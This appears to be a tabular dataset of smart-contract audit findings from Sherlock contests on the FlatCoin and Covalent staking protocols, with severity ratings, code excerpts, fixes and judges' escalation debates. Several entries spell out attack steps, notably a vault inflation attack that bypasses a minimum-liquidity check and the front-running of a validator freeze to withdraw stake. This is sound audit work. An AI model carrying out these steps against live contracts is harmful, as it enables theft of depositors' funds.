system.\nThird Example: The accounting error led to the tracked balance and actual collateral balance not being in sync.\nCode Snippet\nTool used\nManual Review
Asymmetry in profit and loss (PnL) calculationsчhighч```\nPnL = Position Size * Price Shift / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = 40 rETH * ($2000 - $1000) / $2000\nPnL = $40000 / $2000 = 20 rETH\n```\nчAn asymmetry arises in profit and loss (PnL) calculations due to relative price changes. This discrepancy emerges when adjustments to a position lead to differing PnL outcomes despite equivalent absolute price shifts in rETH, leading to loss of assets.\nScenario 1\nAssume at $T0$, the price of rETH is $1000. Bob opened a long position with the following state:\nPosition Size = 40 ETH\nMargin = $x$ ETH\nAt $T2$, the price of rETH increased to $2000. Thus, Bob's PnL is as follows: he gains 20 rETH.\n```\nPnL = Position Size * Price Shift / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = 40 rETH * ($2000 - $1000) / $2000\nPnL = $40000 / $2000 = 20 rETH\n```\n\nImportant Note: In terms of dollars, each ETH earns $1000. Since the position held 40 ETH, the position gained $40000.\nScenario 2\nAssume at $T0$, the price of rETH is $1000. Bob opened a long position with the following state:\nPosition Size = 40 ETH\nMargin = $x$ ETH\nAt $T1$, the price of rETH dropped to $500. An adjustment is executed against Bob's long position, and a `newMargin` is computed to account for the PnL accrued till now, as shown in Line 191 below. Thus, Bob's PnL is as follows: he lost 40 rETH.\n```\nPnL = Position Size * Price Shift / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = 40 rETH * ($500 - $1000) / $500\nPnL = -$20000 / $500 = -40 rETH\n```\n\nAt this point, the position's `marginDeposited` will be $(x - 40)\ rETH$ and `lastPrice` set to $500.\nImportant Note 1: In terms of dollars, each ETH lost $500. Since the position held 40 ETH, the position lost $20000\nAt $T2$, the price of rETH increases from $500 to $2000. Thus, Bob's PnL is as follows:\n```\nPnL = Position Size * Price Shift / Current Price\nPnL = Position Size * (Current Price - Last Price) / Current Price\nPnL = 40 rETH * ($2000 - $500) / $500\nPnL = $60000 / $2000 = 30 rETH\n```\n\nAt this point, the position's `marginDeposited` will be $(x - 40 + 30)\ rETH$, which is equal to $(x - 10)\ rETH$. This effectively means that Bob has lost 10 rETH of the total margin he deposited.\nImportant Note 2: In terms of dollars, each ETH gains $1500. Since the position held 40 ETH, the position gained $60000.\nImportant Note 3: If we add up the loss of $20000 at 𝑇1 and the gain of $60000 at 𝑇2, the overall PnL is a gain of $40000 at the end.\nAnalysis\nThe final PnL of a position should be equivalent regardless of the number of adjustments/position updates made between $T0$ and $T2$. However, the current implementation does not conform to this property. Bob gains 20 rETH in the first scenario, while Bob loses 10 rETH in the second scenario.\nThere are several reasons that lead to this issue:\nThe PnL calculation emphasizes relative price changes (percentage) rather than absolute price changes (dollar value). This leads to asymmetric rETH outcomes for the same absolute dollar gains/losses. If we have used the dollar to compute the PnL, both scenarios will return the same correct result, with a gain of $40000 at the end, as shown in the examples above. (Refer to the important note above)\nThe formula for PnL calculation is sensitive to the proportion of the price change relative to the current price. This causes the rETH gains/losses to be non-linear even when the absolute dollar gains/losses are the same.\nExtra Example\nThe current approach to computing the PnL will also cause issues in another area besides the one shown above. The following example aims to demonstrate that it can cause a desync between the PnL accumulated by the global positions AND the PnL of all the individual open positions in the system.\nThe following shows the two open positions owned by Alice and Bob. The current price of ETH is $1000 and the current time is $T0$\nAlice's Long Position Bob's Long Position\nPosition Size = 100 ETH\nEntry Price = $1000 Position Size = 50 ETH\nEntry Price = $1000\nAt $T1$, the price of ETH drops from $1000 to $750, and the `updateGlobalPositionData` function is executed. The `profitLossTotal` is computed as below. Thus, the `marginDepositedTotal` decreased by 50 ETH.\n```\npriceShift = $750 - $1000 = -$250\nprofitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price\nprofitLossTotal = (150 ETH * -$250) / $750 = -50 ETH\n```\n\nAt $T2$, the price of ETH drops from $750 to $500, and the `updateGlobalPositionData` function is executed. The `profitLossTotal` is computed as below. Thus, the `marginDepositedTotal` decreased by 75 ETH.\n```\npriceShift = $500 - $750 = -$250\nprofitLossTotal = (globalPosition.sizeOpenedTotal * priceShift) / price\nprofitLossTotal = (150 ETH * -$250) / $500 = -75 ETH\n```\n\nIn total, the `marginDepositedTotal` decreased by 125 ETH (50 + 75), which means that the long traders lost 125 ETH from $T0$ to $T2$.\nHowever, when we compute the loss of Alice and Bob's positions at $T2$, they lost a total of 150 ETH, which deviated from the loss of 125 ETH in the global position data.\n```\nAlice's PNL\npriceShift = current price - entry price = $500 - $1000 = -$500\nPnL = (position size * priceShift) / current price\nPnL = (100 ETH * -$500) / $500 = -100 ETH\n\nBob's PNL\npriceShift = current price - entry price = $500 - $1000 = -$500\nPnL = (position size * priceShift) / current price\nPnL = (50 ETH * -$500) / $500 = -50 ETH\n```\nч"Consider tracking the PnL in dollar value/term to ensure consistency between the rETH and dollar representations of gains and losses.\nAppendix\nCompared to SNX V2, it is not vulnerable to this issue. The reason is that in SNX V2 when it computes the PnL, it does not ""scale"" down the result by the price. The PnL in SNXv2 is simply computed in dollar value ($positionSize \times priceShift$), while FlatCoin protocol computes in collateral (rETH) term ($\frac{positionSize \times priceShift}{price}$).\n```\nfunction _profitLoss(Position memory position, uint price) internal pure returns (int pnl) {\n    int priceShift = int(price).sub(int(position.lastPrice));\n    return int(position.size).multiplyDecimal(priceShift);\n}\n```\n\n```\n/*\n * The initial margin of a position, plus any PnL and funding it has accrued. The resulting value may be negative.\n */\nfunction _marginPlusProfitFunding(Position memory position, uint price) internal view returns (int) {\n    int funding = _accruedFunding(position, price);\n    return int(position.margin).add(_profitLoss(position, price)).add(funding);\n}\n```\n\nDiscussion\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266."чLoss of assets, as demonstrated in the second scenario in the first example above. The tracking of profit and loss, which is the key component within the protocol, both on the position level and global level, is broken.\nCode Snippet\nTool used\nManual Review
Fees are ignored when checks skew max in Stable Withdrawal / Leverage Open / Leverage Adjustчmediumч```\n        vault.updateStableCollateralTotal(-int256(_amountOut));\n```\nчFees are ignored when checks skew max in Stable Withdrawal / Leverage Open / Leverage Adjust.\nWhen user withdrawal from the stable LP, vault total stable collateral is updated:\n```\n        vault.updateStableCollateralTotal(-int256(_amountOut));\n```\n\nThen _withdrawFee is calculated and checkSkewMax(...) function is called to ensure that the system will not be too skewed towards longs:\n```\n            // Apply the withdraw fee if it's not the final withdrawal.\n            _withdrawFee = (stableWithdrawFee * _amountOut) / 1e18;\n\n            // additionalSkew = 0 because withdrawal was already processed above.\n            vault.checkSkewMax({additionalSkew: 0});\n```\n\nAt the end of the execution, vault collateral is settled again with withdrawFee, keeper receives keeperFee and `(amountOut - totalFee)` amount of collaterals are transferred to the user:\n```\n        // include the fees here to check for slippage\n        amountOut -= totalFee;\n\n        if (amountOut < stableWithdraw.minAmountOut)\n            revert FlatcoinErrors.HighSlippage(amountOut, stableWithdraw.minAmountOut);\n\n        // Settle the collateral\n        vault.updateStableCollateralTotal(int256(withdrawFee)); // pay the withdrawal fee to stable LPs\n        vault.sendCollateral({to: msg.sender, amount: order.keeperFee}); // pay the keeper their fee\n        vault.sendCollateral({to: account, amount: amountOut}); // transfer remaining amount to the trader\n```\n\nThe `totalFee` is composed of keeper fee and withdrawal fee:\n```\n        uint256 totalFee = order.keeperFee + withdrawFee;\n```\n\nThis means withdrawal fee is still in the vault, however this fee is ignored when checks skew max and protocol may revert on a safe withdrawal. Consider the following scenario:\nskewFractionMax is `120%` and stableWithdrawFee is 1%;\nAlice deposits `100` collateral and Bob opens a leverage position with size 100;\nAt the moment, there is `100` collaterals in the Vault, skew is `0` and skew fraction is 100%;\nAlice tries to withdraw `16.8` collaterals, withdrawFee is `0.168`, after withdrawal, it is expected that there is `83.368` stable collaterals in the Vault, so skewFraction should be `119.5%`, which is less than skewFractionMax;\nHowever, the withdrawal will actually fail because when protocol checks skew max, withdrawFee is ignored and the skewFraction turns out to be `120.19%`, which is higher than skewFractionMax.\nThe same issue may occur when protocol executes a leverage open and leverage adjust, in both executions, tradeFee is ignored when checks skew max.\nPlease see the test codes:\n```\n    function test_audit_withdraw_fee_ignored_when_checks_skew_max() public {\n        // skewFractionMax is 120%\n        uint256 skewFractionMax = vaultProxy.skewFractionMax();\n        assertEq(skewFractionMax, 120e16);\n\n        // withdraw fee is 1%\n        vm.prank(vaultProxy.owner());\n        stableModProxy.setStableWithdrawFee(1e16);\n\n        uint256 collateralPrice = 1000e8;\n\n        uint256 depositAmount = 100e18;\n        announceAndExecuteDeposit({\n            traderAccount: alice,\n            keeperAccount: keeper,\n            depositAmount: depositAmount,\n            oraclePrice: collateralPrice,\n            keeperFeeAmount: 0\n        });\n\n        uint256 additionalSize = 100e18;\n        announceAndExecuteLeverageOpen({\n            traderAccount: bob,\n            keeperAccount: keeper,\n            margin: 50e18,\n            additionalSize: 100e18,\n            oraclePrice: collateralPrice,\n            keeperFeeAmount: 0\n        });\n\n        // After leverage Open, skew is 0\n        int256 skewAfterLeverageOpen = vaultProxy.getCurrentSkew();\n        assertEq(skewAfterLeverageOpen, 0);\n        // skew fraction is 100%\n        uint256 skewFractionAfterLeverageOpen = getLongSkewFraction();\n        assertEq(skewFractionAfterLeverageOpen, 1e18);\n\n        // Note: comment out `vault.checkSkewMax({additionalSkew: 0})` and below lines to see the actual skew fraction\n        // Alice withdraws 16.8 collateral\n        // uint256 aliceLpBalance = stableModProxy.balanceOf(alice);\n        // announceAndExecuteWithdraw({\n        //     traderAccount: alice, \n        //     keeperAccount: keeper, \n        //     withdrawAmount: 168e17, \n        //     oraclePrice: collateralPrice, \n        //     keeperFeeAmount: 0\n        // });\n\n        // // After withdrawal, the actual skew fraction is 119.9%, less than skewFractionMax\n        // uint256 skewFactionAfterWithdrawal = getLongSkewFraction();\n        // assertEq(skewFactionAfterWithdrawal, 1199501007580846367);\n\n        // console2.log(WETH.balanceOf(address(vaultProxy)));\n    }\n```\nч
In LeverageModule.executeOpen/executeAdjust, vault.checkSkewMax should be called after updating the global position dataчmediumч```\nstableCollateralTotal = 90e18\n_globalPositions = {  \n    sizeOpenedTotal: 100e18,  \n    lastPrice: 1800e18,  \n}\nA new position is to be opened with additionalSize = 5e18.  \nfresh price=2000e18\n```\nчWhen `profitLossTotal` is positive value, then `stableCollateralTotal` will decrease.\nWhen `profitLossTotal` is negative value, then `stableCollateralTotal` will increase.\nAssume the following:\n```\nstableCollateralTotal = 90e18\n_globalPositions = {  \n    sizeOpenedTotal: 100e18,  \n    lastPrice: 1800e18,  \n}\nA new position is to be opened with additionalSize = 5e18.  \nfresh price=2000e18\n```\n\nWe explain it in two situations:\n`checkSkewMax` is called before `updateGlobalPositionData`.\n```\nlongSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal \n                 = (100e18 + 5e18) * 1e18 / 90e18 \n                 = 1.16667e18 < skewFractionMax(1.2e18)\nso checkSkewMax will be passed.\n```\n\n`checkSkewMax` is called after `updateGlobalPositionData`.\n```\nIn updateGlobalPositionData:  \nPerpMath._profitLossTotal calculates\nprofitLossTotal = _globalPositions.sizeOpenedTotal * (int256(price) - int256(globalPosition.lastPrice)) / int256(price) \n                = 100e18 * (2000e18 - 1800e18) / 2000e18 = 100e18 * 200e18 /2000e18 \n                = 10e18 \n_updateStableCollateralTotal(-profitLossTotal) will deduct 10e18 from stableCollateralTotal. \nso stableCollateralTotal = 90e18 - 10e18 = 80e18.  \n\nNow, checkSkewMax is called:  \nlongSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal \n                 = (100e18 + 5e18) * 1e18 / 80e18 \n                 = 1.3125e18 > skewFractionMax(1.2e18)\n```\n\nTherefore, this new position should not be allowed to open, as this will only make the system more skewed towards the long side.чDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: checkSkewMax should be adjusted; medium(6)\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.\nitsermin\nResolved here: https://github.com/dhedge/flatcoin-v1/pull/266 Because collateral is no longer settled in `updateGlobalPositionData`чThe `stableCollateralTotal` used by `checkSkewMax` is the value of the total profit that has not yet been settled, which is old value. In this way, when the price of collateral rises, it will cause the system to be more skewed towards the long side.\nCode Snippet\nTool used\nManual Review
Vault Inflation Attackчmediumч```\n_collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;\n_liquidityMinted = (depositAmount * (10 ** decimals())) / _collateralPerShare\n```\nчMalicious users can perform an inflation attack against the vault to steal the assets of the victim.\nA malicious user can perform a donation to execute a classic first depositor/ERC4626 inflation Attack against the FlatCoin vault. The general process of this attack is well-known, and a detailed explanation of this attack can be found in many of the resources such as the following:\nhttps://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks\nhttps://mixbytes.io/blog/overview-of-the-inflation-attack\nIn short, to kick-start the attack, the malicious user will often usually mint the smallest possible amount of shares (e.g., 1 wei) and then donate significant assets to the vault to inflate the number of assets per share. Subsequently, it will cause a rounding error when other users deposit.\nHowever, in Flatcoin, there are various safeguards in place to mitigate this attack. Thus, one would need to perform additional steps to workaround/bypass the existing controls.\nLet's divide the setup of the attack into two main parts:\nMalicious user mint 1 mint of share\nDonate or transfer assets to the vault to inflate the assets per share\nPart 1 - Malicious user mint 1 mint of share\nUsers could attempt to mint 1 wei of share. However, the validation check at Line 79 will revert as the share minted is less than `MIN_LIQUIDITY` = 10_000. However, this minimum liquidation requirement check can be bypassed.\nFirst, Bob mints 10000 wei shares via `executeDeposit` function. Next, Bob withdraws 9999 wei shares via the `executeWithdraw`. In the end, Bob successfully owned only 1 wei share, which is the prerequisite for this attack.\nPart 2 - Donate or transfer assets to the vault to inflate the assets per share\nThe vault tracks the number of collateral within the state variables. Thus, simply transferring rETH collateral to the vault directly will not work, and the assets per share will remain the same.\nTo work around this, Bob creates a large number of accounts (with different wallet addresses). He could choose any or both of the following methods to indirectly transfer collateral to the LP pool/vault to inflate the assets per share:\nOpen a large number of leveraged long positions with the intention of incurring large amounts of losses. The long positions' losses are the gains of the LPs, and the collateral per share will increase.\nOpen a large number of leveraged long positions till the max skew of 120%. Thus, this will cause the funding rate to increase, and the long will have to pay the LPs, which will also increase the collateral per share.\nTriggering rounding error\nThe `stableCollateralPerShare` will be inflated at this point. Following is the formula used to determine the number of shares minted to the depositor.\nIf the `depositAmount` by the victim is not sufficiently large enough, the amount of shares minted to the depositor will round down to zero.\n```\n_collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;\n_liquidityMinted = (depositAmount * (10 ** decimals())) / _collateralPerShare\n```\n\nFinally, the attacker withdraws their share from the pool. Since they are the only ones with any shares, this withdrawal equals the balance of the vault. This means the attacker also withdraws the tokens deposited by the victim earlier.ч"
Long traders unable to withdraw their assetsчmediumч```\nprofitLossTotal = 51 ETH (gain by long)\n\nnewMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal\nnewMarginDepositedTotal = 50 ETH + 0 + 51 ETH = 101 ETH\n\n_updateStableCollateralTotal(-51 ETH)\nnewStableCollateralTotal = stableCollateralTotal + _stableCollateralAdjustment\nnewStableCollateralTotal = 50 ETH + (-51 ETH) = -1 ETH\nstableCollateralTotal = (newStableCollateralTotal > 0) ? newStableCollateralTotal : 0;\nstableCollateralTotal = 0\n```\nчWhenever the protocol reaches a state where the long trader's profit is larger than LP's stable collateral total, the protocol will be bricked. As a result, the margin deposited and gain of the long traders can no longer be withdrawn and the LPs cannot withdraw their collateral, leading to a loss of assets for the users.\nPer Line 97 below, if the collateral balance is less than the tracked balance, the `_getCollateralNet` invariant check will revert.\nAssume that:\nBob's long position: Margin = 50 ETH\nAlice's LP: Deposited = 50 ETH\nCollateral Balance = 100 ETH\nTracked Balance = 100 ETH (Stable Collateral Total = 50 ETH, Margin Deposited Total = 50 ETH)\nAssume that Bob's long position gains a profit of 51 ETH.\nThe following actions will trigger the `updateGlobalPositionData` function internally: executeOpen, executeAdjust, executeClose, and liquidation.\nWhen the `FlatcoinVault.updateGlobalPositionData` function is triggered to update the global position data:\n```\nprofitLossTotal = 51 ETH (gain by long)\n\nnewMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal\nnewMarginDepositedTotal = 50 ETH + 0 + 51 ETH = 101 ETH\n\n_updateStableCollateralTotal(-51 ETH)\nnewStableCollateralTotal = stableCollateralTotal + _stableCollateralAdjustment\nnewStableCollateralTotal = 50 ETH + (-51 ETH) = -1 ETH\nstableCollateralTotal = (newStableCollateralTotal > 0) ? newStableCollateralTotal : 0;\nstableCollateralTotal = 0\n```\n\nIn this case, the state becomes as follows:\nCollateral Balance = 100 ETH\nTracked Balance = 101 ETH (Stable Collateral Total = 0 ETH, Margin Deposited Total = 101 ETH)\nNotice that the Collateral Balance and Tracked Balance are no longer in sync. As such, the revert will occur when the `_getCollateralNet` invariant checks are performed.\nWhenever the protocol reaches a state where the long trader's profit is larger than LP's stable collateral total, this issue will occur, and the protocol will be bricked. The margin deposited and gain of the long traders can no longer be withdrawn from the protocol. The LPs also cannot withdraw their collateral.\nThe reason is that the `_getCollateralNet` invariant checks are performed in all functions of the protocol that can be accessed by users (listed below):\nDeposit\nWithdraw\nOpen Position\nAdjust Position\nClose Position\nLiquidateч"Currently, when the loss of the LP is more than the existing `stableCollateralTotal`, the loss will be capped at zero, and it will not go negative. In the above example, the `stableCollateralTotal` is 50, and the loss is 51. Thus, the `stableCollateralTotal` is set to zero instead of -1.\nThe loss of LP and the gain of the trader should be aligned or symmetric. However, this is not the case in the current implementation. In the above example, the gain of traders is 51, while the loss of LP is 50, which results in a discrepancy here.\nTo fix the issue, the loss of LP and the gain of the trader should be aligned. For instance, in the above example, if the loss of LP is capped at 50, then the profit of traders must also be capped at 50.\nFollowing is a high-level logic of the fix:\n```\nIf (profitLossTotal > stableCollateralTotal): // (51 > 50) => True\n profitLossTotal = stableCollateralTotal // profitLossTotal = 50\n \nnewMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal // 50 + 0 + 50 = 100\n \nnewStableCollateralTotal = stableCollateralTotal + (-profitLossTotal) // 50 + (-50) = 0\nstableCollateralTotal = (newStableCollateralTotal > 0) ? newStableCollateralTotal : 0; // stableCollateralTotal = 0\n```\n\nThe comment above verifies that the logic is working as intended.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: high(6)\nydspa\nEscalate\nThis should be a medium issue, as the likelihood is extreme low due to strict external market conditions\nFlatcoin can be net short and ETH goes up 5x in a short period of time, potentially leading to UNIT going to 0. https://audits.sherlock.xyz/contests/132\nMeet sherlock's rule for Medium\nCauses a loss of funds but requires certain external conditions or specific states\nBut not meet the rule for High\nDefinite loss of funds without (extensive) limitations of external conditions\nsherlock-admin2\nEscalate\nThis should be a medium issue, as the likelihood is extreme low due to strict external market conditions\nFlatcoin can be net short and ETH goes up 5x in a short period of time, potentially leading to UNIT going to 0. https://audits.sherlock.xyz/contests/132\nMeet sherlock's rule for Medium\nCauses a loss of funds but requires certain external conditions or specific states\nBut not meet the rule for High\nDefinite loss of funds without (extensive) limitations of external conditions\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nxiaoming9090\nDisagree with the escalation. The following point in the escalation is simply a remark by the protocol team stating that if the ETH goes up 5x, the value of UNIT token will go down to zero\nFlatcoin can be net short and ETH goes up 5x in a short period of time, potentially leading to UNIT going to 0. https://audits.sherlock.xyz/contests/132\nIt has nothing to do with preventing the protocol from reaching a state where the long trader's profit is larger than LP's stable collateral total.\nOn the other hand, this point made by the protocol team actually reinforces the case I made in the report. The point by the protocol team highlighted the fact that the ETH can go up significantly over a short period of time. When this happens, the long trader's profit will be large. Thus, it will cause the protocol to reach a state where the long trader's profit is larger than LP's stable collateral total, which triggers this issue. When this happens, the protocol will be bricked, thus justified for a High.\nAlso, the requirement for High is ""Definite loss of funds without (extensive) limitations of external conditions"". This issue can occur without extensive external conditions as only one condition, which is the price of the ETH goes up significantly, is needed to trigger the bug. Thus, it meets the requirement of a High issue.\nCzar102\n@xiaoming9090 aren't protocol risk parameters set not to allow the long traders' profits to be larger than LP funds?\nxiaoming9090\n@xiaoming9090 aren't protocol risk parameters set not to allow the long traders' profits to be larger than LP funds?\n@Czar102 The risk parameter I'm aware of is the `skewFractionMax` parameter, which prevents the system from having too many long positions compared to short positions. The maximum ratio of long to short position size is 1.2 (120% long: 100% long) during the audit. The purpose of limiting the number of long positions is to avoid the long side wiping out the value of the short side (LP) too quickly when the ETH price goes up.\nHowever, I'm unaware of any restrictions constraining long traders' profits. The long traders' profits will increase along with the increase in ETH price.\nCzar102\nSo, the price needs to go up 5x in order to trigger this issue?\nxiaoming9090\n@Czar102 Depending on the `skewFractionMax` parameter being configured at any single point of time. The owner can change this value via the `setSkewFractionMax` function. The higher the value is, the smaller the price increase needed to trigger the issue.\nIf the `skewFractionMax` is set to 20%, 5x will cause the LP's UNIT holding to drop to zero. Thus, slightly more than 5x will trigger this issue. Sidenote: The 20% is chosen in this report since it was mentioned in the contest's README\nCzar102\nI think this is a fair assumption to have these values set so that other positions will practically never go into negative values – so this bug will practically never be triggered. Hence, the assumptions for this issue to be triggered are quite extensive.\nPlanning to accept the escalation and consider this issue a Medium severity one.\n0xjuaan\nSo it seems that in order for this issue to be triggered, ETH has to rise 5x in a short period of time.\nHowever in the 'known issues/acceptable risks that should not result in a valid finding' section of the contest README, it says:\ntheoretically, if ETH price increases by 5x in a short period of time whilst the flatcoin holders are 20% short, it's possible for flatcoin value to go to 0. This scenario is deemed to be extremely unlikely and the funding rate is able to move quickly enough to bring the flatcoin holders back to delta neutral.\nSince that scenario is required to trigger this issue, this issue should not be deemed as valid.\nxiaoming9090\nSo it seems that in order for this issue to be triggered, ETH has to rise 5x in a short period of time.\nHowever in the 'known issues/acceptable risks that should not result in a valid finding' section of the contest README, it says:\ntheoretically, if ETH price increases by 5x in a short period of time whilst the flatcoin holders are 20% short, it's possible for flatcoin value to go to 0. This scenario is deemed to be extremely unlikely and the funding rate is able to move quickly enough to bring the flatcoin holders back to delta neutral.\nSince that scenario is required to trigger this issue, this issue should not be deemed as valid.\nThe README mentioned that the team is aware of a scenario where the price can go up significantly, leading the LP's Flatcoin value to go to 0. However, that does not mean that the team is aware of other potential consequences when this scenario happens.\n0xjuaan\nBut surely if the sponsor deemed that the very rapid 5x price increase of ETH is extremely unlikely, that means that its an acceptable risk that they take on. So any issue which relies on that scenario is a part of that same acceptable risk, so shouldn't be valid right?\nThe sponsor clarified why they accept this risk and issues relating to this scenario shouldn't be reported, in this public discord message\nHello everyone. I believe some of you guys might have a doubt whether UNIT going to 0 is an issue or not. I believe it was mentioned that UNIT going to 0 is a known behaviour of the system but the reason might not be clear as to why. If the collateral price increases by let's say 5x (in case the skew limit is 120%), the entire short side (UNIT LPs) will be liquidated (though not liquidated in the same way as how leveraged longs are). The system will most likely not be able to recover as longs can simply close their positions and the take away the collateral. The hope is that this scenario doesn't play out in the future due to informed LPs and funding rate and other incentives but we know this is crypto and anything is possible here. Just wanted to clarify this so that we don't get this as a reported issue.\nxiaoming9090\nThe team is aware and has accepted that FlatCoin's value (short-side/LP) will go to zero when the price goes up significantly. However, that is different from this report where the long traders are unable to withdraw when the price goes up significantly.\nThese are two separate issues, and the root causes are different. The reason why the FlatCoin's value can go to zero is due to the design of the protocol where the short side can lose to the long side. However, this report and its duplicated reports highlighted a bug in the existing implementation that could lead to long traders being unable to withdraw.\nnevillehuang\nI think this is a fair assumption to have these values set so that other positions will practically never go into negative values – so this bug will practically never be triggered. Hence, the assumptions for this issue to be triggered are quite extensive.\nPlanning to accept the escalation and consider this issue a Medium severity one.\nAgree to downgrade to medium severity based on dependency of large price increases.\nCzar102\nBased on https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/196#issuecomment-1970315654, still planning to consider this a valid Medium.\nCzar102\nResult: Medium Has duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nydspa: accepted"чLoss of assets for the users. Since the protocol is bricked due to revert, the long traders are unable to withdraw their deposited margin and gain and the LPs cannot withdraw their collateral.\nCode Snippet\nTool used\nManual Review
OperationalStaking may not possess enough CQT for the last withdrawalчmediumч```\n    function _tokensToShares(\n        uint128 amount,\n        uint128 rate\n    ) internal view returns (uint128) {\n        return uint128((uint256(amount) * DIVIDER) / uint256(rate));\n    }\n```\nч"Both `_sharesToTokens` and `_tokensToShares` round down instead of rounding off against the user. This can result in users withdrawing few weis more than they should, which in turn would make the last CQT transfer from the contract revert due to insufficient balance.\nWhen users `stake`, the shares they will receive is calculated via _tokensToShares:\n```\n    function _tokensToShares(\n        uint128 amount,\n        uint128 rate\n    ) internal view returns (uint128) {\n        return uint128((uint256(amount) * DIVIDER) / uint256(rate));\n    }\n```\n\nSo the rounding will be against the user, or zero if the user provided the right amount of CQT.\nWhen users unstake, their shares are decreased by\n```\n    function _sharesToTokens(\n        uint128 sharesN,\n        uint128 rate\n    ) internal view returns (uint128) {\n        return uint128((uint256(sharesN) * uint256(rate)) / DIVIDER);\n    }\n```\n\nSo it is possible to `stake` and `unstake` such amounts, that would leave dust amount of shares on user's balance after their full withdrawal. However, dust amounts can not be withdrawn due to the check in _redeemRewards:\n```\n        require(\n            effectiveAmount >= REWARD_REDEEM_THRESHOLD,\n            ""Requested amount must be higher than redeem threshold""\n        );\n```\n\nBut, if the user does not withdraw immediately, but instead does it after the multiplier is increased, the dust he received from rounding error becomes withdrawable, because his `totalUnlockedValue` becomes greater than `REWARD_REDEEM_THRESHOLD`.\nSo the user will end up withdrawing more than their `initialStake + shareOfRewards`, which means, if the rounding after all other operations stays net-zero for the protocol, there won't be enough CQT for the last CQT withdrawal (be it `transferUnstakedOut`, `redeemRewards`, or redeemCommission).\nFoundry PoC"ч"`_sharesToTokens` and `_tokensToShares`, instead of rounding down, should always round off against the user.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: watson explained how rounding error would prevent the the last to withdraw the chance to unless there are some changes in place; medium(5)\nnoslav\nThe issue lies in this check\n```\n        require(\n            effectiveAmount >= REWARD_REDEEM_THRESHOLD,\n            ""Requested amount must be higher than redeem threshold""\n        );\n```\n\nwhere the value by default for REWARD_REDEEM_THRESHOLD is 10*8 and hence redemption below that value is not possible leading to the build up of dust as the issue describes until that threshold is crossed\nnoslav\nfixed by round up sharesToBurn and sharesToRemove due to uint258 to uint128 co\nrogarcia\ncorrect PR commit https://github.com/covalenthq/cqt-staking/pull/125/commits/5a771c3aa5f046c06bd531f0f49530fb7d7bfdee"чVictim's transactions will keep reverting unless they figure out that they need to decrease their withdrawal amount.\nCode Snippet\nTool used\nManual Review
Frontrunning validator freeze to withdraw tokensчmediumч"```\n require(!v.frozen, ""Validator is frozen"");\n```\n"ч"Covalent implements a freeze mechanism to disable malicious Validators, this allows the protocol to block all interactions with a validator when he behaves maliciously. Covalent also implements a timelock to ensure tokens are only withdraw after a certain amount of time. After the cooldown ends, tokens can always be withdrawn.\nFollowing problem arise now: because the tokens can always be withdrawn, a malicious Validator can listen for a potential ""freeze"" transaction in the mempool, front run this transaction to unstake his tokens and withdraw them after the cooldown end.\nAlmost every action on the Operational Staking contract checks if the validator is frozen or not:\n```\n require(!v.frozen, ""Validator is frozen"");\n```\n\nThe methods transferUnstakedOut() and recoverUnstaking() are both not checking for this, making the unstake transaction front runnable. Here are the only checks of transferUnstakedOut():\n```\nrequire(validatorId < validatorsN, ""Invalid validator"");\n        require(_validators[validatorId].unstakings[msg.sender].length > unstakingId, ""Unstaking does not exist"");\n        Unstaking storage us = _validators[validatorId].unstakings[msg.sender][unstakingId];\n        require(us.amount >= amount, ""Unstaking has less tokens"");\n```\n\nThis makes following attack possible:\nValidator cheats and gets rewarded fees.\nProtocol notices the misbehavior and initiates a Freeze transaction\nValidator sees the transaction and starts a unstake() transaction with higher gas.\nValidator gets frozen, but the unstaking is already done\nValidator waits for cooldown and withdraws tokens.\nNow the validator has gained unfairly obtained tokens and withdrawn his stake."ч"Implement a check if validator is frozen on `transferUnstakedOut()` and `recoverUnstaking()`, and revert transaction if true.\nIf freezing all unstakings is undesirable (e.g. not freezing honest unstakes), the sponsor may consider storing the unstake timestamp as well:\nStore the unstaking block number for each unstake.\nFreeze the validator from a certain past block only, only unstakings that occur from that block onwards will get frozen.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\ninvalid: this is theoretically not possile due to the cooldown time; the time will allow the governance to pause the contract/function\nnoslav\nfixed by check validator not frozen for recoverUnstaking & transferUnstakedOut\nnevillehuang\nInvalid, both are user facing functions, not validators.\nOot2k\nEscalate\nI believe this issue was mistakenly excluded, the frontrunning of freeze transaction is indeed a problem like described in the Report.\nThe impact described is clearly medium, because this attack makes the freeze function almost useless. Also it generates clear loss of funds for the protocol, because in most cases a malicious validator might accrue rewards which do not belong to him.\nThis issue can not really be fixed by governance pausing the contract, this would pause the contract for everyone else aswell and cause even more damage.\nThe fix by protocol teams looks good.\nTo summarize: Issue is fixed, impact is High, issue should be open and valid.\nsherlock-admin\nEscalate\nI believe this issue was mistakenly excluded, the frontrunning of freeze transaction is indeed a problem like described in the Report.\nThe impact described is clearly medium, because this attack makes the freeze function almost useless. Also it generates clear loss of funds for the protocol, because in most cases a malicious validator might accrue rewards which do not belong to him.\nThis issue can not really be fixed by governance pausing the contract, this would pause the contract for everyone else aswell and cause even more damage.\nThe fix by protocol teams looks good.\nTo summarize: Issue is 